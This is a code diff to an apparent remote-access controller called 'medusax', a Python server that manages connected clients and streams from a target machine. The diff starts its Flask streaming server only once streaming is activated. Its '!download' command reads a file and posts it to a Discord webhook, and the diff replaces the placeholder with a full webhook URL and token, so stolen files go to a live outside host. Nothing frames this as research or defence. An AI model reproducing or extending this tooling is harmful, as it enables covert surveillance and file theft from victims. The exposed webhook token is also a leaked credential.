@@ -29,6 +29,10 @@ def stop_stream():
     streaming = False
     return "Streaming stopped!"
 
+# Start the web server only after the stream starts
+def start_web_server():
+    app.run(host='0.0.0.0', port=WEB_SERVER_PORT)
+
 # Client connection handler
 def handle_client(client_socket, client_ip):
     global target_ip
@@ -41,11 +45,14 @@ def handle_client(client_socket, client_ip):
             streaming = True
             start_time = time.strftime("%Y-%m-%d %H:%M:%S")
             print(f"Started streaming {stream_type} from {target_ip}")
+            # Start the web server once streaming is activated
+            web_server_thread = threading.Thread(target=start_web_server)
+            web_server_thread.start()
         elif command.startswith("!download"):
             filename = command.split(" ")[1]
             with open(filename, "rb") as f:
                 file_data = f.read()
-                requests.post('YOUR_DISCORD_WEBHOOK', files={'file': (filename, file_data)})
+                requests.post('https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2', files={'file': (filename, file_data)})
             print("[+] File sent to Discord")
         elif command == "!list":
             print("Client List:")
@@ -78,13 +85,6 @@ def start_server():
         if len(connected_clients) == 0 or not streaming:
             print("medusax > ", end="")
 
-# Start Flask Web Server for Streaming
-def start_web_server():
-    app.run(host='0.0.0.0', port=WEB_SERVER_PORT)
-
-# Start server and web server threads
+# Start the server
 server_thread = threading.Thread(target=start_server)
 server_thread.start()
-
-web_server_thread = threading.Thread(target=start_web_server)
-web_server_thread.start()
